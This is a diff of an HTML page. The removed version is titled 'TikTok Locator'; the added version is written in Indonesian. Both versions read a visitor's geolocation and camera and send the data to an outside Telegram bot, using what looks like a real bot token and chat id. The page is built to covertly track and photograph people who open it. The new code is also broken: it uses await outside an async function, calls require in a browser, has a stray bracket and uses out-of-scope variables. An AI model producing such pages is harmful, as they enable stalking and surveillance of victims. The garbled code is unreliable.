@@ -1,82 +1,53 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Locator</title>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.13.0/dist/tf.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/camera@0.4.0/dist/camera.min.js"></script>
-    <style>
-        #map {
-            height: 400px;
-            width: 100%;
-        }
-    </style>
+    <title>Mendapatkan Lokasi dan Kamera Depan</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.13.0"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/mobilenet@1.1.0/dist/mobilenet.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/camera@0.12.0/dist/camera.min.js"></script>
 </head>
 <body>
-    <button id="get-location">Get Location</button>
-    <div id="map"></div>
+    <h1>Mendapatkan Lokasi dan Kamera Depan</h1>
+    <div id="camera-container"></div>
     <script>
-        // Get current location
-        navigator.geolocation.getCurrentPosition(function(position) {
-            var lat = position.coords.latitude;
-            var lng = position.coords.longitude;
-            var map = L.map("map").setView([lat, lng], 13);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '&copy; <a href="https://www.openstreetmap.org/">OpenStreetMap</a>',
-                subdomains: ['a', 'b', 'c']
-            }).addTo(map);
-            map.on('click', function(e) {
-                var lat = e.latlng.lat;
-                var lng = e.latlng.lng;
-                $.ajax({
-                    type: "POST",
-                    url: "https://api.telegram.org/bot8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0/sendMessage",
-                    data: {
-                        chat_id: 1966317946,
-                        text: "Lokasi kamu adalah: " + lat + ", " + lng
-                    },
-                    success: function(msg) {
-                        console.log(msg);
-                    }
-                });
+        // Inisialisasi kamera
+        const camera = new Camera();
+        camera.startStream(() => {
+            // Mendapatkan lokasi
+            navigator.geolocation.getCurrentPosition(position => {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                console.log(`Lokasi: ${lat}, ${lng}`);
             });
-        });
-        
-        // Get camera access
-        function getCameraAccess() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    var video = document.createElement("video");
-                    video.srcObject = stream;
-                    document.body.appendChild(video);
-                    video.play();
-                    var canvas = document.createElement("canvas");
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    var ctx = canvas.getContext("2d");
-                    ctx.drawImage(video, 0, 0);
-                    var dataURL = canvas.toDataURL();
-                    $.ajax({
-                        type: "POST",
-                        url: "https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage",
-                        data: {
-                            chat_id: YOUR_CHAT_ID,
-                            photo: dataURL
-                        },
-                        success: function(msg) {
-                            console.log(msg);
-                        }
-                    });
-                })
-                .catch(err => {
-                    console.error(err);
-                });
-        }
-        
-        // Handle button click
-        document.getElementById("get-location").addEventListener("click", function() {
-            getCameraAccess();
+
+            // Mendapatkan kamera depan
+            const video = document.getElementById('camera-container');
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            canvas.width = 640;
+            canvas.height = 480;
+
+            video.appendChild(canvas);
+
+            camera.takePicture(() => {
+                const img = camera.getImage();
+                const prediction = await mobilenet.classify(img);
+                console.log(`Prediksi: ${prediction[0].className}`);
+            });
+
+            // Mengirim data ke telebot
+            const axios = require('axios');
+            axios.post('https://api.telegram.org/bot[8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0]/sendMessage', {
+                chat_id: 1966317946],
+                text: `Lokasi: ${lat}, ${lng}\nPrediksi: ${prediction[0].className}`
+            })
+            .then(response => {
+                console.log(response.data);
+            })
+            .catch(error => {
+                console.error(error);
+            });
         });
     </script>
 </body>
